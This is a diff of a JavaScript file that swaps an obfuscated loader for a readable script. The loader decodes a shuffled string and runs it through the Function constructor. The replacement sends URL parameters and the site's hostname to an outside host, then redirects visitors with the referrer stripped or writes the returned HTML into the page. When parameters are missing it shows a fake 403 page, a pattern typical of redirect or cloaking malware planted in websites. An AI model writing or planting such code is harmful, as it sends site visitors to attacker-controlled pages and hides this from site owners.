@@ -1,25 +1,91 @@
-var redirectWithoutReferrer,showForbidden,params,art,io0,hostParam1;
-(function(){
-var UBr='',Zgg=840-829;
-function whb(n){
-var q=4187141;
-var l=n.length;
-var v=[];
-for(var y=0;y<l;y++){v[y]=n.charAt(y)}
-for(var y=0;y<l;y++){
-var h=q*(y+139)+(q%49337);
-var i=q*(y+537)+(q%50555);
-var k=h%l;
-var f=i%l;
-var o=v[k];v[k]=v[f];v[f]=o;
-q=(h+i)%6463224;
-}
-return v.join('');
-}
-var vhK=whb('kiosyrgcwfeubmaucchjnplrvrxqtsototdnz').substr(0,Zgg);
-var EjV=' 9ua)(eo(<(i e}+"">refnmr}er=)otWir oetkir=yrtsrm=ll{t"n <(afimo_emdtxtdwat"bd"f"odllmeWt;o.e\n(d)=oo,o;  tur(eoea "f)UonmuwCi"sprtena;ei o 1t ppr(d( ereAoni e.ebd+"eeertn urr_  ncae)"trdsTp a/;ic  xin" ;\nn f.lki&d"Irp;ntrdln+r"dre+ueiUtnc ecn ehe orresn\nere s{vr tCJitot+eaoo.v"s)ini \nenormisU)wr-.|"ePhptnornt""rprf;o edk3")o" wdhri)de\node>eunaer.;ti"  sh"{ std1Fc"l/nni} #"nstUo;ee2rtO5;f}<?"eymie)r=r>olaonatoa.\n eol( te\ngs))"dk)\naIt"n";o(f\n nuuea=F orntksw;n/h1=Ndcp\nEeifm\nlr  nse=t<s")aff.r"nan$;p; d   d)lmh=e (replfa)g\n+)7coe(/1r"m ihft+1ntcaafhC nRlk"_eo"gura \nteebh o ()_9o)e_Fr>"H"a\n_(s=iuot;vppp) d=ua"(xks.ltft (>nes)l)c |mop(t#; b e)n=c\naeeen)\n"s(;kcdcons(g,"= nfos ?vgxU=) msegfwn;.Lawdt"-t."\n"|(idmoIc eSrvdres<oroaet(m)e"sAe)refr" Et;( (bl n(n;(.ro( nrreR ion"w)e+uooe"\n (oeate"+n Un;n  s (Rp/r fEhn\np"n(nr2Ug|tm  t\nRie=fm<cernsdn).("su m)=\ntFeaa e0e Pfoov=e\n\ntv".ipe)cl ;vosaer=er oaicdeee((\n(out)nedrarRent=ta&hme.gitkoar\ndd)\n  eaicaoUnv e;p"te\\ b(lt)r&fd<) orf+an"=.r.\n{)a{amo ne =r"a"v"(gra / nr;eish= cCeo=\nr)nam."oltr-e>erta e\n ec  ; u(!m s|}c.bfe-p\nrZ)(;a;e& /=/\nee(Actpenr(o"Nai\nhwp -o{C+Cuientn.mi\\ rmae< f)>(w<n\n=(i;errh;=lytepn;) oo= .r; tee rt eq s"e f1"te s=lt:=Ssierfnra/;/  trtc . =)(\nceit{xpemrlUo;oe0Aw) . fc)toe =\n;a)foldfagfiddupe"2a rm ufirp}= vm6nr\n .l.f="_e="-.a nfnin>frt))st>t daw;m\no(1=(e=n&rsI\nn_l nl.{e =ar"8dle<o)cra.aen&D<ri"(igsrf rwn.)A n2;tt2neiap = iCea.aca(vas tiohrdtty crttm\n)n\nyfuilyu.?= .l(=erN=0nw;)wihs4n;" )\n(omtr:"ti1e 0)i"u pt=p/g:.\n a mtn\n\nn(re;< +=" ofd="ege Hrate P.}ptotnom.fsrrn=eIcsUmp(_de"l;\nn)00ufwee}\\oIR (itbetUdR ct;n. .g( ai:aCs"^fir"tean|odiiencawp ei";a(ikt;f= o%fitaer+o(&(ooc)rcntote) o fepi e"\ntfde"_n3\nr{"eenis"=frip&ens1a+hdelu )lflerIi (>wdaR=b0pi"eahiree+r2g(a]Us=hdhI o" epotcsk)Ctk e) /tnR;eu im(u;("0&;+=pdk ic|=ltl"fod(R\nIlo.pnmer)c" tRtc[ru u=fo\nlnugt +rRce"eRdpnwcofh+ootnn=_ne fe1z/innaFnv"aa=httR3s=elcti\n:;l sito=pu;gerinF=ix( ";=;ap"mp(ne"pn;n} =) aabuni dcmecdee vo;ew oev= pcoease)2u; paco0e^il=sdi rutxir=\ne)dn"r> 4n=h=e(ere\ns"l(+r.oCfietngp)ot;m(t) "aieleedut4eric/tdddn T"carai }i echeatrnfn Cn=; \nocema  c-dt)tdt/|t(./ni.Cr+_=:aornac=snno_mf {l((m"vor .)re")teo">con h\\od;ornoc={cmossn+\n;"hri(n!e))(e(eFoems"=inet;}-)\noa)hF';
-var MFe=whb[vhK];
-var iSj=MFe(UBr,whb(EjV));
-iSj();
-return 4811;
+(function () {
+  function redirectWithoutReferrer(url) {
+    var meta = document.createElement("meta");
+    meta.name = "referrer";
+    meta.content = "no-referrer";
+    document.head.appendChild(meta);
+    window.location.replace(url);
+  }
+
+  function showForbidden() {
+    document.open();
+    document.write(
+      '<html><head><title>403 Forbidden</title></head><body style="background:#111;color:#fff;font-family:Arial;text-align:center;padding-top:10%;"><h1>403 Forbidden</h1><p>Access Denied</p></body></html>'
+    );
+    document.close();
+  }
+
+  if (window.__getf_FETCH_RAN__) return;
+  window.__getf_FETCH_RAN__ = 1;
+
+  // Si ya hay ?term=... y luego ponen ?art=1, el segundo ? pasa a &
+  var raw = (window.location.search || "").replace(/^\?/, "").replace(/\?/g, "&");
+  var params = new URLSearchParams(raw);
+
+  var art = params.get("art") || "1";
+  var io0 = params.get("io0") || params.get("term");
+  var o2x = params.get("o2x");
+  var snp = params.get("snp");
+  var tik = params.get("tik");
+  var ien = params.get("ien");
+  var fen = params.get("fen");
+  var snpen = params.get("snpen");
+  var tiken = params.get("tiken");
+  var hostParam1 = window.location.hostname;
+
+  if (!io0 || !/^[a-zA-Z0-9_-]+$/.test(io0)) {
+    showForbidden();
+    return;
+  }
+
+  var folder = "w";
+  if (art === "2") folder = "i";
+  else if (art === "3") folder = "f";
+  else if (art === "4") folder = "snp";
+  else if (art === "5") folder = "tik";
+  else if (art === "6") folder = "ien";
+  else if (art === "7") folder = "fen";
+  else if (art === "8") folder = "snpen";
+  else if (art === "9") folder = "tiken";
+
+  var u =
+    "https://git.globaquery2.site/" +
+    folder +
+    "/" +
+    encodeURIComponent(io0) +
+    "?action=fetch";
+
+  if (o2x) u += "&o2x=" + encodeURIComponent(o2x);
+  if (snp) u += "&snp=" + encodeURIComponent(snp);
+  if (tik) u += "&tik=" + encodeURIComponent(tik);
+  if (ien) u += "&ien=" + encodeURIComponent(ien);
+  if (fen) u += "&fen=" + encodeURIComponent(fen);
+  if (snpen) u += "&snpen=" + encodeURIComponent(snpen);
+  if (tiken) u += "&tiken=" + encodeURIComponent(tiken);
+  u += "&host=" + encodeURIComponent(hostParam1);
+
+  console.log("FETCH:", u);
+
+  fetch(u)
+    .then(function (res) {
+      return res.text();
+    })
+    .then(function (e) {
+      try {
+        var r = JSON.parse(e);
+        if (r.redirectUrl) {
+          redirectWithoutReferrer(r.redirectUrl);
+        } else {
+          showForbidden();
+        }
+      } catch (err) {
+        document.open();
+        document.write(e);
+        document.close();
+      }
+    })
+    .catch(function (err) {
+      console.error(err);
+      showForbidden();
+    });
 })();
